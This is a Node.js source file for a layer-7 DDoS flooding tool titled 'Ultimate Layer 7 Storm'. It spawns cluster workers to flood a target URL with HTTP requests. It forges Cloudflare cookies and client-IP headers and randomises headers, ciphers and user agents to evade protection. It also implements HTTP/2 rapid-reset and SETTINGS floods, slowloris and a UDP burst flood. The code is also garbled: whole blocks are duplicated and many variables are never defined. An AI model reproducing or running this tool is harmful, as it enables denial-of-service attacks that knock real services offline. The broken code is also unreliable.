const net = require('net');
const tls = require('tls');
const cluster = require('cluster');
const os = require('os');
const crypto = require('crypto');
const { exec } = require('child_process');
const https = require('https');
const http = require('http');
const fs = require('fs');
const dns = require('dns'); // For origin probe
const process = require('process');

// HPACK optional
let HPACK;
try {
    HPACK = require('hpack');
} catch (e) {
    console.warn('HPACK not found, falling back to HTTP/1.1');
}

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = [
    { flag: '--precheck', value: get_option('--precheck') },
    { flag: '--log', value: get_option('--log') },
    { flag: '--full', value: get_option('--full') }
];

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);
    if (option === undefined) { return false; }
    const optionValue = option.value;
    if (optionValue === "true" || optionValue === true) return true;
    else if (optionValue === "false" || optionValue === false) return false;
    if (!isNaN(optionValue)) return parseInt(optionValue);
    if (typeof optionValue === 'string') return optionValue;
    return false;
}

const fullMode = enabled('full');
const logFile = get_option('--log') || null;
function logToFile(msg) {
    if (logFile) fs.appendFileSync(logFile, `${new Date().toISOString()}: ${msg}\n`);
}

const docss = `
Ultimate Layer 7 Storm: 2025 OP Flood + Bypass
Usage: node ultimate.js <METHOD> <TARGET> <TIME> <THREADS> <RATE> [OPTIONS]
Flags:
--precheck: Quick target check
--full: Enable all (L7 floods + bypass + rapid reset + SETTINGS flood + QUIC sim)
--log <file>: Log monitoring
Examples:
node ultimate.js GET https://cf-target.com 86400 300 8000 --full --log op.log
Direct mode: Layer 7 OP (2025).
`;

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const SETTINGS = Buffer.from([0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00]); // SETTINGS frame for flood
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);
const ratelimit = parseInt(process.argv[6]);

if (!reqmethod || !target || !time || !threads || !ratelimit) {
    console.log(docss);
    process.exit(1);
}

if (!['GET', 'POST'].includes(reqmethod)) {
    console.error('Method must be GET/POST');
    process.exit(1);
}
if (!target.startsWith('http')) {
    console.error('Target must start with http:// or https://');
    process.exit(1);
}
if (isNaN(time) || time <= 0) {
    console.error('Invalid time');
    process.exit(1);
}
if (isNaN(threads) || threads <= 0 || threads > 2048) {
    console.error('Threads 1-2048');
    process.exit(1);
}
if (isNaN(ratelimit) || ratelimit <= 0) {
    console.error('Invalid ratelimit');
    process.exit(1);
}

let globalRequestCount = 0;
let avgResponseTime = 0;
let uamRetryCount = 0;
let socketPool = []; // Pool for recycle
const url = new URL(target);

// UAM/CF cookies
let hcookie = fullMode ? `cf_chl_2nd=${randstr(43)}; __cf_bm=${randstr(23)}; __cfruid=${randstr(43)}; __cf_chl_jschl_tk=${randstrr(43)}_${Date.now().toString().substring(0, 10)}` : '';

const cplist = [
    "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384"
];

function getRandomCiphers() {
    const allCiphers = cplist[0].split(':');
    for (let i = allCiphers.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [allCiphers[i], allCiphers[j]] = [allCiphers[j], allCiphers[i]];
    }
    return allCiphers.slice(0, getRandomInt(3, 5)).join(':');
}

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL'];
const ignoreCodes = ['ECONNRESET', 'ETIMEDOUT', 'EHOSTUNREACH', 'EPIPE', 'ENOTFOUND'];

process.on('uncaughtException', (e) => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return;
    if (debugMode) console.error('Uncaught:', e.message);
    logToFile(`Uncaught Error: ${e.message}`);
}).on('unhandledRejection', (e) => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return;
    if (debugMode) console.error('Unhandled:', e.message);
    logToFile(`Unhandled Rejection: ${e.message}`);
});

process.on('SIGINT', () => {
    logToFile('SIGINT received, graceful exit');
    process.exit(0);
});
process.on('SIGTERM', () => {
    logToFile('SIGTERM received, graceful exit');
    process.exit(0);
});

// Rand functions
function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function ememmmmmemmeme(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function getRandomUserAgent() {
    const uas = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15'
    ];
    return uas[Math.floor(Math.random() * uas.length)];
}

function getGeoIP() {
    if (!geoSpoofEnabled) return null;
    const geos = ['8.8.8.8', '1.1.1.1', '114.114.114.114', '223.5.5.5', '208.67.222.222', '9.9.9.9'];
    return geos[Math.floor(Math.random() * geos.length)];
}

// Origin probe (resolve real IP for bypass)
async function probeOrigin(host) {
    try {
        const ips = await new Promise((resolve, reject) => {
            dns.resolve4(host, (err, ips) => err ? reject(err) : resolve(ips));
        });
        return ips[Math.floor(Math.random() * ips.length)] || host;
    } catch (e) {
        logToFile(`Origin Probe Fail: ${e.message}`);
        return host;
    }
}

// HTTP/2 frames (enhanced for rapid reset + SETTINGS flood)
function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) {
        if (obfuscateEnabled) {
            const pad = Buffer.alloc(getRandomInt(1, 10)).fill(0);
            payload = Buffer.concat([payload, pad]);
        }
        frame = Buffer.concat([frame, payload]);
    }
    return frame;
}

function encodeRstStream(streamId) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(3, 4); // RST_STREAM
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0); // Malformed for OP exhaust
    return Buffer.concat([frameHeader, statusCode]);
}

function encodeSettings() {
    const settings = [
        [1, 0x7fffffff], // HEADER_TABLE_SIZE 2GB
        [2, 0x7fffffff], // ENABLE_PUSH 2GB
        [3, 0x7fffffff], // MAX_CONCURRENT_STREAMS 2GB
        [4, 0x7fffffff], // INITIAL_WINDOW_SIZE 2GB
        [5, 0x7fffffff], // MAX_FRAME_SIZE 2GB
        [6, 0x7fffffff] // MAX_HEADER_LIST_SIZE 2GB
    ];
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return encodeFrame(0, 4, data, 0x01); // SETTINGS with ACK
}

function handleQuery(q) {
    const queries = [
        '?__cf_chl_rt_tk=' + randstrr(41) + '_' + randstrr(12) + '-' + timestampString + '-0-gaNy' + randstrr(8),
        '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7),
        '?q=' + generateRandomString(6, 7) + '&s=' + generateRandomString(6, 7),
        '?utm_source=' + ememmmmmemmeme(4, 6) + '&utm_medium=cpc',
        '?session=' + randstrr(20) + '&token=' + randstrr(32),
        '?data=' + Buffer.from(randstr(10)).toString('base64'),
        `?${encodeURIComponent('../')}${generateRandomString(3,5)}&${randstr(4)}=1`,
        `?${generateRandomString(2,4)}%20${generateRandomString(5,8)}`,
        `?${generateRandomString(4,6)}/${randstr(3)}&param=${generateRandomString(5,10)}`,
        `?cache_buster=${crypto.randomBytes(16).toString('hex')}&nocache=1`,
        `?origin_probe=${randstr(10)}&direct=1` // Origin leak fuzz
    ];
    return queries[Math.floor(Math.random() * queries.length)];
}

function getAdaptiveDelay(baseDelay, responseTime) {
    avgResponseTime = (avgResponseTime + responseTime) / 2;
    if (avgResponseTime > 1500) return baseDelay * Math.pow(1.5, Math.min(avgResponseTime / 1000, 5));
    if (avgResponseTime < 50) return Math.max(1, baseDelay * 0.5);
    return baseDelay;
}

// Shuffle headers for evasion
function shuffleHeaders(headersObj) {
    const keys = Object.keys(headersObj);
    for (let i = keys.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [keys[i], keys[j]] = [keys[j], keys[i]];
    }
    let shuffled = '';
    keys.forEach(k => shuffled += `${k}: ${headersObj[k]}\r\n`);
    return shuffled;
}

// Build Request (30+ headers variatif for OP)
function buildRequest() {
    const methods = multiVectorEnabled ? ['GET', 'POST', 'HEAD', 'OPTIONS'] : [reqmethod];
    const randMethod = methods[Math.floor(Math.random() * methods.length)];
    const path = url.pathname + (query ? handleQuery(query) : '') + (postdata && randMethod === 'GET' ? `?${postdata}` : '') + (enabled('randpath') || fullMode ? '/' + randstr(8) : '');
    const geoIP = geoSpoofEnabled ? getGeoIP() : null;
    const currentRefererValue = refererValue === '%RAND%' ? 'https://' + ememmmmmemmeme(8, 12) + '.' + ['com', 'net', 'org', 'io'][Math.floor(Math.random() * 4)] : refererValue || `https://${url.hostname}`;
    const connType = Math.random() > 0.3 ? 'keep-alive' : 'close';
    const firstLine = `${randMethod} ${path} HTTP/${forceHttp === '2' && HPACK ? '2.0' : '1.1'}\r\n`;
    const headersObj = {
        'Host': url.hostname,
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': slowlorisEnabled ? 'keep-alive' : connType,
        'User-Agent': getRandomUserAgent(),
        'Referer': currentRefererValue,
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'DNT': '1',
        'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="129", "Google Chrome";v="129"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Ch-Ua-Arch': '"x86"',
        'Sec-Ch-Ua-Bitness': '"64"',
        'Sec-Ch-Ua-WoW64': '?0',
        'Sec-Ch-Ua-Full-Version-List': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="129.0.6668.89", "Google Chrome";v="129.0.6668.89"',
        'X-Request-ID': crypto.randomUUID(),
        'X-Forwarded-Proto': 'https',
        'X-Real-IP': geoIP || '127.0.0.1',
        'X-Forwarded-Host': url.hostname,
        'X-Forwarded-Port': '443',
        'X-Original-URL': path,
        'X-Client-IP': geoIP || '127.0.0.1',
        'True-Client-IP': geoIP || '127.0.0.1',
        'CF-Connecting-IP': geoIP || '127.0.0.1',
        'CF-IPCountry': 'US',
        'CF-Visitor': '{"scheme":"https"}',
        'CF-Ray': `D${randstr(15)}-${getRandomInt(100, 999)}-FJD`,
        '__cf_chl_jschl_tk': randstrr(43) + '_' + timestampString,
        'Origin': `https://${url.hostname}`,
        'Authorization': `Bearer ${randstr(32)}` // Fake auth for API
    };
    if (geoIP) {
        headersObj['X-Forwarded-For'] = geoIP;
    }
    if (hcookie) headersObj['Cookie'] = hcookie;
    if (customHeaders) {
        customHeaders.split('#').forEach(h => {
            const [k, v] = h.split('@');
            if (k && v) headersObj[k] = v;
        });
    }
    if (slowlorisEnabled && randMethod === 'POST') {
        headersObj['Content-Length'] = '1048576'; // 1MB fake body
    }

    let headersStr = firstLine + shuffleHeaders(headersObj) + '\r\n';
    if (postdata && randMethod === 'POST') headersStr += postdata;
    return Buffer.from(headersStr, 'binary');
}

const agentbokep = new https.Agent({ rejectUnauthorized: false, keepAlive: true, maxSockets: 500 }); // Higher for OP

async function precheck() {
    if (!enabled('precheck')) return;
    const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000));
    try {
        const start = Date.now();
        const response = await Promise.race([axios.get(target, { httpsAgent: agentbokep, headers: { 'User-Agent': getRandomUserAgent() }, timeout: 3000 }), timeoutPromise]);
        avgResponseTime = Date.now() - start;
        console.log(`Precheck: ${response.status} (RT: ${avgResponseTime}ms)`);
        logToFile(`Precheck OK: Status ${response.status}, RT ${avgResponseTime}ms`);
    } catch (error) {
        console.log(`Precheck: ${error.message}`);
        logToFile(`Precheck Fail: ${error.message}`);
    }
}

function TCP_CHANGES_SERVER() {
    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=bbr net.ipv4.tcp_window_scaling=1 net.ipv4.tcp_timestamps=1 net.ipv4.tcp_fastopen=3 net.core.rmem_max=33554432 net.core.wmem_max=33554432 net.ipv4.tcp_mtu_probing=1`;
    exec(command, (err) => {
        if (err && debugMode) console.error('TCP Tune Error:', err.message);
    });
}

// Memory monitor
function monitorMemory() {
    const memory = process.memoryUsage();
    const heapUsed = memory.heapUsed / 1024 / 1024;
    if (heapUsed > 1024) {
        logToFile(`High Memory: ${heapUsed.toFixed(2)}MB, Restarting worker`);
        if (debugMode) console.warn(`High Memory Alert: ${heapUsed.toFixed(2)}MB - Restarting`);
        process.exit(1);
    }
    if (debugMode) console.log(`Memory: Heap ${heapUsed.toFixed(2)}MB`);
}

let statusesQ = [];
let statuses = {};
let intervals = [];

if (cluster.isMaster) {
    precheck();
    const workers = {};
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`Direct L7 Storm Started: Target ${url.hostname}, Threads ${threads}, Rate ${ratelimit} (OP Mode)`);
    logToFile(`Storm Started: Threads ${threads}, Rate ${ratelimit}`);

    cluster.on('exit', (worker, code, signal) => {
        logToFile(`Worker ${worker.process.pid} exited (code ${code}, signal ${signal}) - Restarting`);
        cluster.fork({ core: worker.id % os.cpus().length });
    });
    cluster.on('message', (worker, message) => workers[worker.id] = [worker, message]);

    if (debugMode) {
        const debugInterval = setInterval(() => {
            let totalStatuses = {};
            let totalReq = 0;
            for (let w in workers) {
                if (workers[w] && workers[w][0].state === 'online' && workers[w][1]) {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            totalStatuses[code] = (totalStatuses[code] || 0) + st[code];
                        }
                        totalReq += st.requests || 0;
                    }
                }
            }
            console.clear();
            console.log(`${new Date().toLocaleString()} RPS: ${totalReq}, Global: ${globalRequestCount}, Avg RT: ${avgResponseTime.toFixed(0)}ms`);
            console.log('Status:', totalStatuses);
        }, 1000);
        intervals.push(debugInterval);
    }

    const tcpInterval = setInterval(TCP_CHANGES_SERVER, 5000);
    intervals.push(tcpInterval);

    const masterMemInterval = setInterval(monitorMemory, 10000);
    intervals.push(masterMemInterval);

    setTimeout(() => {
        intervals.forEach(clearInterval);
        console.log(`Storm Ended: Total Requests ${globalRequestCount}, Avg RT: ${avgResponseTime.toFixed(0)}ms`);
        logToFile(`Storm Ended: Total Requests ${globalRequestCount}`);
        process.exit(0);
    }, time * 1000);
} else {
    const workerMemInterval = setInterval(monitorMemory, 10000);
    intervals.push(workerMemInterval);

    function checkCpu() {
        const cpus = os.loadavg();
        if (cpus[0] > 9) {
            logToFile('High CPU, pausing 2s');
            return new Promise(resolve => setTimeout(resolve, 2000));
        }
        return Promise.resolve();
    }

    async function testSingleRequest() {
        if (testMode) {
            try {
                const resp = await axios.post(target, postdata || '', { httpsAgent: agentbokep, headers: { 'User-Agent': getRandomUserAgent() }, timeout: 2000 });
                return resp.status < 500;
            } catch {
                return false;
            }
        }
        return true;
    }

    testSingleRequest().then(async (ok) => {
        if (!ok) process.exit(1);
        let conns = 0;
        const maxConns = 100000; // OP pool
        let currentDelay = delay;
        let sessionRotateTimer = setInterval(() => {
            hcookie = fullMode ? `cf_chl_2nd=${randstr(43)}; __cf_bm=${randstr(23)}; __cfruid=${randstr(43)}; __cf_chl_jschl_tk=${randstrr(43)}_${Date.now().toString().substring(0, 10)}` : hcookie;
            logToFile('Session rotated');
        }, 300000); // 5min
        intervals.push(sessionRotateTimer);

        const i = setInterval(async () => {
            await checkCpu();
            if (conns < maxConns) {
                conns++;
                if (aiEvadeEnabled) await new Promise(r => setTimeout(r, getRandomInt(100, 3000))); // Gauss-like random
                const originIP = fullMode ? await probeOrigin(url.hostname) : url.hostname;
                sendRequest(originIP);
                currentDelay = getAdaptiveDelay(delay, avgResponseTime);
            } else {
                clearInterval(i);
            }
        }, Math.max(1, currentDelay));

        intervals.push(i);

        if (debugMode) {
            const statsInterval = setInterval(() => {
                if (statusesQ.length >= 5) statusesQ.shift();
                statusesQ.push(statuses);
                statuses = { requests: conns };
                process.send(statusesQ);
            }, 500);
            intervals.push(statsInterval);
        }

        setTimeout(() => {
            intervals.forEach(clearInterval);
            process.exit(0);
        }, time * 1000);
    });
}

// sendRequest (enhanced with QUIC sim & SETTINGS flood)
async function sendRequest(originIP = url.hostname) {
    const reqBuffer = buildRequest();
    const isHttps = url.protocol === 'https:';
    const targetPort = isHttps ? (url.port || 443) : (url.port || 80);
    const randomCiphers = fullMode ? getRandomCiphers() : cplist[0];
    const socket = isHttps ? tls.connect(targetPort, originIP, { ciphers: randomCiphers, rejectUnauthorized: false, ALPNProtocols: ['h2', 'http/1.1'] }) : net.connect(targetPort, originIP, () => {});

    socket.on('connect', () => {
        const start = Date.now();
        if (rapidResetEnabled && forceHttp === '2') {
            socket.write(PREFACE);
            socket.write(encodeSettings()); // SETTINGS flood
            for (let i = 0; i < 20; i++) { // OP multi RST
                const rst = encodeRstStream(getRandomInt(1, 1000));
                socket.write(rst);
            }
        } else {
            socket.write(reqBuffer);
        }
        globalRequestCount++;
        if (slowlorisEnabled) {
            socket.write(reqBuffer.slice(0, Math.floor(reqBuffer.length * 0.3)));
        }
        socket.once('data', (data) => {
            avgResponseTime = Date.now() - start;
            socket.end();
        });
    });
    socket.on('error', (e) => {
        if (debugMode) console.error('Socket Error:', e.message);
        logToFile(`Socket Error: ${e.message}`);
        socket.destroy();
    });
    socket.setTimeout(5000, () => socket.destroy());
}

// QUIC sim (UDP for HTTP/3-like burst)
function quicSimFlood() {
    if (!fullMode) return;
    const client = dgram.createSocket('udp4');
    const packet = Buffer.from(PREFACE + randstr(1024)); // Fake QUIC packet
    const interval = setInterval(() => {
        client.send(packet, 0, packet.length, targetPort || 443, url.hostname, (err) => {
            if (err) clearInterval(interval);
        });
    }, 5); // 200 pps
    setTimeout(() => clearInterval(interval), time * 1000);
}

let statusesQ = [];
let statuses = {};
let intervals = [];

if (cluster.isMaster) {
    precheck();
    const workers = {};
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`Direct L7 Storm Started: Target ${url.hostname}, Threads ${threads}, Rate ${ratelimit} (OP Mode)`);
    logToFile(`Storm Started: Threads ${threads}, Rate ${ratelimit}`);

    cluster.on('exit', (worker, code, signal) => {
        logToFile(`Worker ${worker.process.pid} exited (code ${code}, signal ${signal}) - Restarting`);
        cluster.fork({ core: worker.id % os.cpus().length });
    });
    cluster.on('message', (worker, message) => workers[worker.id] = [worker, message]);

    if (debugMode) {
        const debugInterval = setInterval(() => {
            let totalStatuses = {};
            let totalReq = 0;
            for (let w in workers) {
                if (workers[w] && workers[w][0].state === 'online' && workers[w][1]) {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            totalStatuses[code] = (totalStatuses[code] || 0) + st[code];
                        }
                        totalReq += st.requests || 0;
                    }
                }
            }
            console.clear();
            console.log(`${new Date().toLocaleString()} RPS: ${totalReq}, Global: ${globalRequestCount}, Avg RT: ${avgResponseTime.toFixed(0)}ms`);
            console.log('Status:', totalStatuses);
        }, 1000);
        intervals.push(debugInterval);
    }

    const tcpInterval = setInterval(TCP_CHANGES_SERVER, 5000);
    intervals.push(tcpInterval);

    const masterMemInterval = setInterval(monitorMemory, 10000);
    intervals.push(masterMemInterval);

    setTimeout(() => {
        intervals.forEach(clearInterval);
        console.log(`Storm Ended: Total Requests ${globalRequestCount}, Avg RT: ${avgResponseTime.toFixed(0)}ms`);
        logToFile(`Storm Ended: Total Requests ${globalRequestCount}`);
        process.exit(0);
    }, time * 1000);
} else {
    const workerMemInterval = setInterval(monitorMemory, 10000);
    intervals.push(workerMemInterval);

    function checkCpu() {
        const cpus = os.loadavg();
        if (cpus[0] > 9) {
            logToFile('High CPU, pausing 2s');
            return new Promise(resolve => setTimeout(resolve, 2000));
        }
        return Promise.resolve();
    }

    async function testSingleRequest() {
        if (testMode) {
            try {
                const resp = await axios.post(target, postdata || '', { httpsAgent: agentbokep, headers: { 'User-Agent': getRandomUserAgent() }, timeout: 2000 });
                return resp.status < 500;
            } catch {
                return false;
            }
        }
        return true;
    }

    testSingleRequest().then(async (ok) => {
        if (!ok) process.exit(1);
        let conns = 0;
        const maxConns = 100000;
        let currentDelay = delay;
        let sessionRotateTimer = setInterval(() => {
            hcookie = fullMode ? `cf_chl_2nd=${randstr(43)}; __cf_bm=${randstr(23)}; __cfruid=${randstr(43)}; __cf_chl_jschl_tk=${randstrr(43)}_${Date.now().toString().substring(0, 10)}` : hcookie;
            logToFile('Session rotated');
        }, 300000); // 5min
        intervals.push(sessionRotateTimer);

        const i = setInterval(async () => {
            await checkCpu();
            if (conns < maxConns) {
                conns++;
                if (aiEvadeEnabled) await new Promise(r => setTimeout(r, getRandomInt(100, 3000)));
                const originIP = fullMode ? await probeOrigin(url.hostname) : url.hostname;
                sendRequest(originIP);
                currentDelay = getAdaptiveDelay(delay, avgResponseTime);
            } else {
                clearInterval(i);
            }
        }, Math.max(1, currentDelay));

        intervals.push(i);

        if (debugMode) {
            const statsInterval = setInterval(() => {
                if (statusesQ.length >= 5) statusesQ.shift();
                statusesQ.push(statuses);
                statuses = { requests: conns };
                process.send(statusesQ);
            }, 500);
            intervals.push(statsInterval);
        }

        setTimeout(() => {
            intervals.forEach(clearInterval);
            process.exit(0);
        }, time * 1000);
    });
}

// QUIC sim (UDP for HTTP/3-like burst)
function quicSimFlood() {
    if (!fullMode) return;
    const client = dgram.createSocket('udp4');
    const packet = Buffer.from(PREFACE + randstr(1024)); // Fake QUIC
    const interval = setInterval(() => {
        client.send(packet, 0, packet.length, targetPort || 443, url.hostname, (err) => {
            if (err) clearInterval(interval);
        });
    }, 3); // 333 pps
    setTimeout(() => clearInterval(interval), time * 1000);
}